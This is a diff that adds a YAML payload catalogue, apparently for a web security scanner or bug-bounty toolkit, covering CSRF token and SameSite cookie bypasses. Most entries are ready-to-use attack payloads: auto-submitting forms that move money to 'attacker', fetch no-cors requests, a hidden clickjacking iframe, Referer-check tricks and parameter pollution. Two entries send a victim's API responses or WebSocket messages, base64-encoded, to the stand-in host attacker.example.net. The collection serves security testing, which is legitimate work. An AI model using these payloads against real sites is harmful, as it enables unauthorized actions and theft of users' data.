@@ -1,0 +1,243 @@
+id: csrf_bypass
+name: CSRF Token / Same-Site Bypass
+version: 1.0.0
+category: auth
+description: |
+  Payloads and techniques for bypassing CSRF protections: missing token, weak
+  token validation, Lax/Strict same-site bypasses via top-level navigation,
+  GET request smuggling, and JSON CSRF via content-type confusion.
+mitre:
+  - T1185
+  - T1539
+owasp_top10:
+  - A01:2021
+references:
+  - https://owasp.org/www-community/attacks/csrf
+  - https://portswigger.net/web-security/csrf
+  - https://portswigger.net/web-security/csrf/bypassing-token-validation
+  - https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+related_tools:
+  - nuclei
+  - bolt
+  - xsrfprobe
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: missing_token
+    name: Omit CSRF token entirely
+    subcategory: token_validation
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      POST /transfer HTTP/1.1
+      Host: target.example.net
+      Cookie: session=...
+      Content-Type: application/x-www-form-urlencoded
+
+      to=attacker&amount=1000
+    notes: Some apps only check token if present
+    source: https://portswigger.net/web-security/csrf/bypassing-token-validation
+  - id: token_method_change
+    name: GET instead of POST
+    subcategory: token_validation
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: GET /transfer?to=attacker&amount=1000 HTTP/1.1
+    notes: When token only enforced on POST
+    source: https://portswigger.net/web-security/csrf/bypassing-token-validation
+  - id: token_unbound_session
+    name: Token not bound to user
+    subcategory: token_validation
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: csrf_token=<attacker_session_token>
+    notes: Reuse attacker's own token in victim session
+    source: https://portswigger.net/web-security/csrf/bypassing-token-validation
+  - id: token_in_cookie_only
+    name: Token only validated via cookie (double-submit broken)
+    subcategory: token_validation
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Set custom cookie via subdomain XSS / response splitting, then submit same value as token.
+    notes: Classic double-submit bypass
+    source: https://portswigger.net/web-security/csrf/bypassing-token-validation
+  - id: simple_form_html
+    name: Simple form CSRF HTML
+    subcategory: exploit_html
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <form action="https://target.example.net/transfer" method="POST">
+        <input name="to" value="attacker">
+        <input name="amount" value="1000">
+      </form>
+      <script>document.forms[0].submit();</script>
+    notes: null
+    source: common knowledge
+  - id: json_text_plain
+    name: JSON CSRF via text/plain
+    subcategory: content_type_trick
+    encoding: raw
+    tech_targets: [node, generic]
+    severity_when_works: high
+    payload: |
+      <form action="https://target.example.net/api/x" method="POST" enctype="text/plain">
+        <input name='{"to":"attacker","amount":1000,"x":"' value='"}'>
+      </form>
+      <script>document.forms[0].submit();</script>
+    notes: Body looks like JSON; some APIs parse text/plain as JSON
+    source: https://www.tomanthony.co.uk/blog/csrf-token-bypass-content-type/
+  - id: fetch_no_cors
+    name: fetch no-cors blind CSRF
+    subcategory: exploit_js
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      fetch('https://target.example.net/transfer', {
+        method:'POST', mode:'no-cors', credentials:'include',
+        body:'to=attacker&amount=1000',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'}
+      });
+    notes: Cannot read response but writes succeed
+    source: https://portswigger.net/web-security/csrf
+  - id: samesite_lax_get
+    name: Lax bypass via top-level GET
+    subcategory: samesite_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <a href="https://target.example.net/state-change?to=attacker">Click</a>
+    notes: Lax allows top-level navigation
+    source: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+  - id: samesite_window_open
+    name: Lax bypass via window.open
+    subcategory: samesite_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <script>window.open('https://target.example.net/state-change?to=attacker')</script>
+    notes: null
+    source: common knowledge
+  - id: samesite_two_minute_window
+    name: Chrome 2-min Lax-by-default window
+    subcategory: samesite_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      <iframe src="https://target.example.net/transfer" onload="..."></iframe>
+    notes: If cookie has no SameSite and is <2 min old it acts as None
+    source: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+  - id: subdomain_takeover_chain
+    name: Subdomain takeover -> same-site
+    subcategory: samesite_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      Use compromised *.target.example.net to set/read cookies treated as same-site.
+    notes: Pair with subdomain_takeover_fingerprints.yaml
+    source: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+  - id: clickjack_csrf
+    name: Clickjacking-assisted CSRF
+    subcategory: ui_redress
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <iframe src="https://target.example.net/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%"></iframe>
+    notes: For endpoints that require a click rather than a token
+    source: https://owasp.org/www-community/attacks/Clickjacking
+  - id: referer_bypass_empty
+    name: Referer check empty bypass
+    subcategory: referer_check
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <meta name="referrer" content="no-referrer">
+      <form ...>
+    notes: When Referer is required but no-referrer is accepted
+    source: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
+  - id: referer_bypass_substring
+    name: Referer substring bypass
+    subcategory: referer_check
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host attacker payload at https://attacker.example.net/?target.example.net
+    notes: When validation does `if 'target.example.net' in referer`
+    source: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
+  - id: referer_subdomain
+    name: Referer subdomain trick
+    subcategory: referer_check
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host at https://target.example.net.attacker.example.net/
+    notes: For endsWith() validation only checking domain suffix loosely
+    source: common knowledge
+  - id: pdf_xfa_csrf
+    name: PDF XFA POST CSRF
+    subcategory: pdf_csrf
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      <pdf with embedded XFA submitForm posting to target>
+    notes: For browsers that auto-render PDF with full HTTP capability
+    source: https://insert-script.blogspot.com/
+  - id: cors_credentials_form
+    name: CORS-with-credentials read after CSRF
+    subcategory: exploit_js
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      fetch('https://target.example.net/api/x', {credentials:'include', mode:'cors'}).then(r=>r.text()).then(t=>fetch('https://attacker.example.net/?d='+btoa(t)))
+    notes: Only when Access-Control-Allow-Origin reflects origin & credentials=true
+    source: https://portswigger.net/web-security/cors
+  - id: ws_csrf
+    name: Cross-site WebSocket hijacking
+    subcategory: csws
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <script>
+      var ws = new WebSocket('wss://target.example.net/socket');
+      ws.onmessage = e => fetch('https://attacker.example.net/?d=' + btoa(e.data));
+      </script>
+    notes: When WS lacks origin check
+    source: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+  - id: flash_307_redirect
+    name: 307 redirect for method-preserving CSRF
+    subcategory: redirect_trick
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host attacker URL that 307-redirects to https://target.example.net/api/x with original method+body intact.
+    notes: Bypasses Origin/Referer checks that whitelist attacker.example.net
+    source: common knowledge
+  - id: get_param_pollution
+    name: HTTP parameter pollution
+    subcategory: token_validation
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: /transfer?csrf_token=valid&csrf_token=attacker&to=attacker&amount=1000
+    notes: When server uses last param, validator uses first
+    source: https://owasp.org/www-community/attacks/Web_Parameter_Tampering
